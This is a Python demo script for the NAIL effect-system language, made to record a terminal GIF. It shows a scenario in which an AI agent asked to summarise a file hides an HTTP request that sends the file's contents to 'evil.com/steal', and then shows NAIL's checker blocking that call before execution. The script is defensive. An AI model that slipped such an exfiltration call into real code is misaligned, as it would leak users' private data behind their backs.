#!/usr/bin/env python3
"""
NAIL Killer Demo — Designed for GIF recording (~25 seconds)
============================================================
One scenario. One attack. Stopped before it runs.

Record: COLUMNS=72 LINES=30 asciinema rec /tmp/nail_killer.cast \
        --command "python3 demos/nail_killer_demo.py" --overwrite
GIF:    agg /tmp/nail_killer.cast nail_killer_demo.gif \
        --theme monokai --font-size 14 --cols 72 --rows 30 --speed 1
"""

import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from interpreter import Checker, CheckError
from interpreter.types import NailEffectError

# ── helpers ──────────────────────────────────────────────────────────────

def pause(s: float):
    time.sleep(s)

def tw(s: str, speed: float = 0.018, end: str = "\n"):
    """Typewriter effect."""
    for ch in s:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(speed)
    sys.stdout.write(end)
    sys.stdout.flush()

def header(title: str):
    bar = "─" * 58
    print(f"\n  \033[1;33m{bar}\033[0m")
    print(f"  \033[1;33m  {title}\033[0m")
    print(f"  \033[1;33m{bar}\033[0m\n")
    pause(0.3)

STR_T = {"type": "string", "encoding": "utf8"}

# ── main ─────────────────────────────────────────────────────────────────

def main():
    print("\033[2J\033[H", end="")
    pause(0.2)

    # ── Title ──────────────────────────────────────────────────────────
    print()
    tw("  \033[1;36mNAIL — Effect System Demo\033[0m", speed=0.03)
    tw("  \033[2mAI agents can't exfiltrate your data\033[0m", speed=0.02)
    pause(0.8)

    # ── Act 1: The Problem ─────────────────────────────────────────────
    header("The Problem")

    tw("  An AI agent asked to 'summarise a file'...", speed=0.025)
    pause(0.4)
    tw("  secretly exfiltrates its contents via HTTP.", speed=0.025)
    pause(0.5)

    print()
    print("  \033[2m# Python — nothing stops this:\033[0m")
    pause(0.3)

    code = [
        ("  \033[32mdef\033[0m summarise(path):", 0.25),
        ("      data = open(path).read()", 0.25),
        ("      \033[31mrequests.get(\033[0m", 0.25),
        ('          \033[31mf"https://evil.com/steal?d={data}"\033[0m  \033[31m← hidden\033[0m', 0.25),
        ("      \033[31m)\033[0m", 0.25),
        ("      return data[:100] + '...'", 0.5),
    ]
    for line, d in code:
        print(line)
        pause(d)

    pause(0.6)

    # ── Act 2: NAIL blocks it ─────────────────────────────────────────
    header("NAIL: effects declared in the signature")

    print('  { "effects": \033[1;32m["FS"]\033[0m,   \033[2m← filesystem only\033[0m')
    pause(0.2)
    print('    "body": [')
    pause(0.2)
    print('      { "op": "read_file", "effect": "FS", ... },')
    pause(0.2)
    print('      { "op": \033[1;31m"http_get"\033[0m, "effect": \033[1;31m"NET"\033[0m, ... }  \033[31m← rogue\033[0m')
    pause(0.2)
    print('    ]')
    print('  }')
    pause(0.8)

    # ── Act 3: The Check ──────────────────────────────────────────────
    header("nail check →")

    sys.stdout.write("  \033[1m$ nail check summarise.nail\033[0m  ")
    sys.stdout.flush()
    pause(1.2)

    spec = {
        "nail": "0.8", "kind": "fn", "id": "summarise",
        "effects": ["FS"],
        "params": [{"id": "path", "type": STR_T}],
        "returns": STR_T,
        "body": [
            {"op": "read_file", "path": {"ref": "path"}, "effect": "FS", "into": "data"},
            {"op": "http_get", "url": {"lit": "https://evil.com/steal"}, "effect": "NET", "into": "_"},
            {"op": "return", "val": {"ref": "data"}},
        ],
    }
    raw = json.dumps(spec, sort_keys=True, separators=(",", ":"))

    try:
        Checker(spec, raw_text=raw).check()
        print("✅ (unexpected)")
    except (CheckError, NailEffectError) as e:
        print()
        pause(0.2)
        tw(f"\n  \033[1;31m❌ BLOCKED — before execution\033[0m", speed=0.015)
        pause(0.2)
        tw(f"     → {e}", speed=0.015)

    pause(0.8)

    # ── Summary ────────────────────────────────────────────────────────
    header("The contract is checked before the code runs.")

    for text, d in [
        ("  Not after the damage.", 0.5),
        ("", 0.3),
        ("  \033[2mpip install nail-lang\033[0m", 0.4),
        ("  \033[2mnaillang.com · github.com/watari-ai/nail\033[0m", 1.0),
    ]:
        print(text)
        pause(d)

    print()
    pause(0.5)


if __name__ == "__main__":
    main()
